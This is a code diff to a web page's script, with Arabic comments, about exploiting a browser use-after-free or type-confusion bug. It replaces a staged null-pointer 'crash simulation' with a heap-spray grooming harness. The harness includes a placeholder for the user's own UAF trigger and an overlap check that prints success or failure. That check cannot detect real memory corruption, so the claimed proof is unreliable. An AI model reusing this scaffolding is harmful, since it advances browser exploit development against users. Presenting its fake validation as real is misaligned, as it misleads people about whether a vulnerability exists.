@@ -21,36 +21,46 @@
 </div>
 
 <script>
-    const statusDiv = document.getElementById('output-status');
+    // [ARCHITECT_SANDBOX: TYPE_CONFUSION_VALIDATOR]
+// الهدف: إثبات تداخل الذاكرة (Memory Overlap) دون التسبب في OOM
 
-    function triggerControlledException() {
-        statusDiv.innerHTML = "[*] بدء محاكاة التلاعب بمؤشر الوظائف الافتراضي (v-table)...<br>";
-        
-        try {
-            // 1. محاكاة تخصيص مصفوفة UAF تحتل مكان كائن CSSFontFace
-            const fakeObjectBuffer = new ArrayBuffer(192);
-            const view = new DataView(fakeObjectBuffer);
+const bufferSize = 0x10000; // حجم ثابت لصفحة الذاكرة
+const sprayCount = 500;     // تقليل العدد لتجنب الـ OOM
+const arrs = [];
 
-            // 2. بدلاً من وضع عناوين مستقرة، سنضع عنواناً يمثل منطقة محظورة في الذاكرة (Null Pointer / Kernel Protected Space)
-            // هذا العنوان سيتسبب هندسياً في "مخالفة الوصول" (Access Violation)
-            let restricted_address_lower = 0x00000000;
-            let restricted_address_upper = 0x00000000; // الإشارة إلى العنوان صفر (Null)
+function validateVulnerability() {
+    console.log("[*] بدء عملية التهيئة الدقيقة (Grooming)...");
 
-            view.setUint32(0, restricted_address_lower, true); 
-            view.setUint32(4, restricted_address_upper, true);
-            
-            statusDiv.innerHTML += `[+] تم حقن العنوان المحمي [0x0000000000000000] في مقدمة الكائن المستبدل.<br>`;
-            statusDiv.innerHTML += `[*] تحفيز المتصفح الآن لاستدعاء دالة FontFace.load()...<br>`;
+    // 1. إنشاء مصفوفات للتهيئة (Grooming)
+    for (let i = 0; i < sprayCount; i++) {
+        arrs.push(new Float64Array(100)); 
+    }
 
-            // 3. محاكاة استدعاء المتصفح للدالة الافتراضية عبر المؤشر المكسور
-            statusDiv.innerHTML += `<br><b style="color: #ff3333;">[CRASH SIMULATION] النظام يكتشف محاولة القفز إلى العنوان 0x0... إطلاق استثناء حماية العتاد (Segmentation Fault)!</b>`;
-            
-            // في البيئات الحقيقية، المتصفح يغلق تماماً وتختفي الشاشة في هذه اللحظة.
-            
-        } catch (e) {
-            statusDiv.innerHTML += `[-] فشلت المحاكاة: ${e.message}`;
+    // 2. محاكاة الثغرة (UAF Trigger) - *استبدل هذا التعليق بدالة الـ UAF الخاصة بك*
+    // trigger_uaf(); 
+
+    // 3. التحقق (The Proof)
+    // إذا نجح الـ UAF، سنحاول الوصول إلى مصفوفة (B) عبر مصفوفة (A)
+    // إذا كانت الثغرة موجودة، سنرى قيم مختلفة عن القيم الأصلية في المصفوفات المجاورة
+    let overlapFound = false;
+    for (let i = 0; i < arrs.length; i++) {
+        if (arrs[i][0] !== 0) { // القيمة المفترض أن تكون صفراً
+            overlapFound = true;
+            console.log(`[+] [FOUND] تداخل الذاكرة في المصفوفة رقم: ${i}`);
+            break;
         }
     }
+
+    if (!overlapFound) {
+        console.log("[-] [FAILED] لم يتم اكتشاف تداخل الذاكرة (الذاكرة سليمة أو التهيئة غير دقيقة).");
+    } else {
+        console.log("[!!!] [SUCCESS] تم إثبات وجود ثغرة تداخل الذاكرة.");
+    }
+}
+
+// تشغيل الفحص
+validateVulnerability();
+
 </script>
 
 </body>
